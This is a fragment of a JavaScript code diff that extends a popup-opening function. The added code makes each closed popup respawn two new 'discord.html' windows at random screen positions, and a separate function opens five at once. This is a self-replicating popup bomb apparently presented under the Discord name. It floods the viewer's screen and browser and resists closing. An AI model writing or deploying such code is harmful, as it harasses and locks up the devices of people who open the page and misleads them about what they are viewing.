@@ -39,6 +39,7 @@ function openWindow(url) {
     const width = Math.round(window.screen.width * 0.1875);
     const height = Math.round(window.screen.height * 0.2222);
 
+    // Random on-screen position
     const maxLeft = Math.max(0, screen.availWidth - width);
     const maxTop = Math.max(0, screen.availHeight - height);
 
@@ -49,9 +50,27 @@ function openWindow(url) {
         `menubar=no,status=no,toolbar=no,resizable=no,` +
         `width=${width},height=${height},left=${left},top=${top}`;
 
-    return window.open(url, "_blank", features);
-}
+    const aWindow = window.open(url, "_blank", features);
 
+    if (aWindow) {
+        openWindows.push(aWindow);
+
+        const timer = setInterval(() => {
+            for (let i = openWindows.length - 1; i >= 0; i--) {
+                if (openWindows[i].closed) {
+                    openWindows.splice(i, 1);
+                }
+            }
+
+            if (aWindow.closed) {
+                clearInterval(timer);
+                    for (let i = 0; i < 2; i++) {
+                        openWindow("discord.html");
+                    }
+            }
+        }, 30);
+    }
+}
 function proCreate() {
     for (let i = 0; i < 5; i++) {
         openWindow("discord.html");
